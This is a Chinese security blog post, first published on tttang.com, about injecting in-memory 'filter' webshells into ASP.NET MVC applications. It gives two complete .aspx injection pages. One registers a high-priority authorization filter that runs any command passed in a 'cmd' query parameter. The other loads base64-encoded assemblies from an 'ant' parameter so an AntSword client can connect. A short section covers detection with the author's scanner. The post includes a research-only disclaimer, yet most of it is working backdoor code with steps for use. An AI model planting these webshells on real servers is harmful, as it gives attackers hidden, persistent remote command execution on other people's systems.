# ASP.NET下的内存马(一)：filter内存马

<meta name="referrer" content="no-referrer" />

本文首发于[ASP.NET下的内存马(1) filter内存马 - 跳跳糖 (tttang.com)](https://tttang.com/archive/1408/)

## 前言

asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。



**文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。**

## ASP.NET MVC结构

java下有filter，servlet等拦截器，asp.net mvc也有同样类似的机制。

在rider中新建一个asp.net web项目，默认就会起一个asp.net mvc的项目。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639574398948-4e4947e3-cd70-431f-a819-d794cb0880a7.png)

根目录下有个 Global.asax文件，这个文件会在web应用启动后首先执行。其中Codebehind指向了Global.asax.cs，在Global.asax.cs中可以看到，在asp.net mvc启动的时候，会默认去注册三个组件。



```cpp
namespace WebApplication2
{
    public class MvcApplication : System.Web.HttpApplication
    {
        protected void Application_Start()
        {
            AreaRegistration.RegisterAllAreas();//注册 MVC 应用程序中的所有区域
            FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);//注册filter
            RouteConfig.RegisterRoutes(RouteTable.Routes);//注册路由
            BundleConfig.RegisterBundles(BundleTable.Bundles);//打包捆绑资源，对css以及js进行压缩
        }
    }
}
```

看下FilterConfig.RegisterGlobalFilters这个方法的作用，就是给全局GlobalFilterCollection里面加入我们自定义的filter逻辑。至于为什么不去看route，因为filter的优先级在route之前，当然是我们的第一选择。

```cpp
namespace WebApplication2
{
    public class FilterConfig
    {
        public static void RegisterGlobalFilters(GlobalFilterCollection filters)
        {
            filters.Add(new HandleErrorAttribute());
        }
    }
}
```

内存马的本质是在容器中注入一段恶意代码，并且由于容器的特性，如filter，servlet等机制，使得每次收到web请求我们的恶意代码都会被执行。

在java中添加filter内存马较为麻烦，需要用反射从上下文中获取到filterMap等信息，然后向里面注入我们自定义的filter。但是在asp.net中，则直接将这个接口给用户暴露了出来。这就极大方便了我们注入内存马的操作。

看了下System.Web.Mvc.GlobalFilterCollection，从注释就可以看出来，这里存放了全局的filter。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639571588020-c10c0100-5861-43ec-81ac-55eb0e7c6a3e.png)

## filter类型



那么应该打入什么类型的filter呢？翻了下文档，ASP.NET MVC 框架支持四种不同类型的筛选器：

1. 授权筛选器 = 实现IAuthorizationFilter属性。
2. 操作筛选器 = 实现IActionFilter属性。

1. 结果筛选器 = 实现IResultFilter属性。
2. 异常筛选器 = 实现IExceptionFilter属性。

筛选器按上面列出的顺序执行。 例如，授权筛选器始终在操作筛选器和异常筛选器始终在每一种其他类型的筛选器之后执行。

授权筛选器用于实现控制器操作的身份验证和授权。 例如，"授权"筛选器是授权筛选器的示例。

操作筛选器包含在控制器操作执行之前和之后执行的逻辑。 例如，可以使用操作筛选器修改控制器操作返回的视图数据。

结果筛选器包含在执行视图结果之前和之后执行的逻辑。 例如，您可能希望在视图呈现给浏览器之前修改视图结果。

异常筛选器是要运行的最后一种筛选器类型。 可以使用异常筛选器来处理控制器操作或控制器操作结果引发的错误。 您还可以使用异常筛选器来记录错误。

每种不同类型的筛选器都按特定顺序执行。 如果要控制执行相同类型的筛选器的顺序，则可以设置筛选器的 Order 属性。

所有操作筛选器的基类是类System.Web.Mvc.FilterAttribute。 如果要实现特定类型的筛选器，则需要创建从基本筛选器类继承的类，并实现一个或多个IAuthorizationFilter、 IActionFilter、或IResultFilter``IExceptionFilter接口。



以上来自微软文档：https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cs



作为攻击者来说，我们当然希望我们的内存马处于最高优先级的位置。所以就选择继承IAuthorizationFilter接口。

除此以外，类比java内存马，还要把我们的filter放到第一位的位置。

## 优先级问题

在默认的System.Web.Mvc.GlobalFilterCollection.Add方法中可以看到，Add有两个重载方法，一个带order参数一个不带。最后调用AddInternal方法把我们的filter添加到类成员中。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639572577725-a1a6d84d-d3d9-4d4b-a931-fb18837ddf8f.png)

查看System.Web.Mvc.Filter，发现默认的filter order是-1。那么为了提高我们的优先级，我们只需要把order设为一个小于-1的值即可。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639206495083-dd43d372-1d10-4861-9e15-9be2eaa3c332.png)

这里有个小细节：仔细研究的同学会发现，Filter类的构造方法除了order参数还有一个scope参数，那么scope参数是干什么的呢？

当有多个 Filter的时候，执行顺序由Order（int 类型）和 Scope（enum 类型，FilterScope）决定。其关键逻辑在FilterComparer中可以看到

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639576119288-8aff42d9-0141-4b13-b99d-42b08453fe1f.png)

总结一下就是：

- Order 和 FilterScope 的数值越小，过滤器的执行优先级越高
- Order 比 FilterScope 具有更高的优先级，在Order属性值相同时FilterScope才会被考虑

## 测试



```cpp
<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Mvc" %>
<script runat="server">
    public class MyAuthFilter : IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            String cmd = filterContext.HttpContext.Request.QueryString["cmd"];
            if (cmd != null)
            {
                HttpResponseBase response = filterContext.HttpContext.Response;
                Process p = new Process();
                p.StartInfo.FileName = cmd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }


            Console.WriteLine("auth filter inject");
        }
    }
</script>
<%
    GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;
    globalFilterCollection.Add(new MyAuthFilter(), -2);
%>
```

访问filter.aspx 注入内存马。一片空白表示注入成功

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639573280439-3d38efd7-f748-4091-908e-97e69ad597f3.png)

访问?cmd=calc弹出计算器

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639573694474-169975da-87b1-47d8-9fdb-6a977f87bb0b.png?x-oss-process=image%2Fresize%2Cw_971%2Climit_0)

蚁剑连接

```cpp
<%@ Page Language="c#"%>
<%@ Import Namespace="System.Web.Mvc" %>
<script runat="server">
    public class MyAuthFilter : IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            HttpContext context = HttpContext.Current;
            String Payload = filterContext.HttpContext.Request.Params["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            Console.WriteLine("auth filter inject");
        }
    }
</script>
<%
    GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;
    globalFilterCollection.Add(new MyAuthFilter(), -2);
%>
```

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1642236255917-65e3cdf1-0e42-4e3b-85cc-a0d960716fb6.png)

## 检测内存马

本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。

下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1642238609914-c8c4e176-07a9-4385-b468-613b42577e08.png)

根据名称可以看到类型为 ASP.shell_filter2_aspx+MyAuthFilter的filter较为可疑。

如果想要实锤怎么操作？

根据CodeBase地址找到编译后的aspx文件，用dnspy等反编译工具打开。

找到对应的具体类shell_filter2_aspx#MyAuthFilter，可以看到其中内容确实为恶意代码。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1642238724255-c2635881-aa56-454b-b87c-9fea07fa71ef.png)

## 总结

根据本人的研究，aspx必须访问一个真实存在的url时才会触发filter，而非像java一样filter可以用/*直接匹配任意路径。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1639573778536-f31c9898-50df-4dff-ab35-c0d0e383fc24.png)

除此之外，java的filter是责任链模式，必须要显式声明chain.doFilter才会走到下一个filter。如果jb小子一时手抖忘了写这句代码，打进内存马后就会造成网站的正常业务无法访问。但是.net没有这种机制。不需要做额外声明即可按顺序调用各个filter。

本文提到的filter内存马必须依赖于system.web.mvc.dll这个东西，也就是只能在.net mvc下使用。那么有没有其他的内存马，可以仅依靠.net framework就可以执行呢？等我下篇文章讲一讲。



## 参考文章

https://www.cnblogs.com/RobbinHan/archive/2011/11/29/2268076.html

https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cs

https://mp.weixin.qq.com/s/cm8pPAw7dZ-iMb4LvVXAlQ
